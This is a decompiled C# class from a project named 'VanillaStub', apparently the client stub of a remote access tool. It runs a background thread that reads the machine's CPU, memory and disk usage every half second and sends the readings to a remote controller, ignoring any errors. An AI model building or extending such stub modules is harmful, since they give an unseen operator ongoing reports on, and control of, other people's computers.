using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using VanillaStub.Helpers.Networking;

namespace VanillaStub.Helpers.Services;

public static class HardwareUsageStream
{
	private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);

	public static bool HardwareUsageActive { get; set; }

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Start()
	{
		if (!HardwareUsageActive)
		{
			HardwareUsageActive = true;
			try
			{
				HardwareUsageThread.Start();
			}
			catch
			{
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (HardwareUsageActive)
		{
			HardwareUsageActive = false;
			try
			{
				HardwareUsageThread.Abort();
				HardwareUsageThread = new Thread(StartHardwareUsage);
			}
			catch
			{
			}
		}
	}

	public static void StartHardwareUsage()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		PerformanceCounter val = new PerformanceCounter("Processor", "% Processor Time", "_Total");
		PerformanceCounter val2 = new PerformanceCounter("Memory", "Available MBytes");
		PerformanceCounter val3 = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
		while (HardwareUsageActive)
		{
			string s = "{" + val.NextValue() + "}[" + val2.NextValue() + "]<" + val3.NextValue() + ">";
			List<byte> list = new List<byte>();
			list.Add(10);
			list.AddRange(Encoding.ASCII.GetBytes(s));
			VanillaStub.Helpers.Networking.Networking.MainClient.Send(list.ToArray());
			Thread.Sleep(500);
		}
	}
}
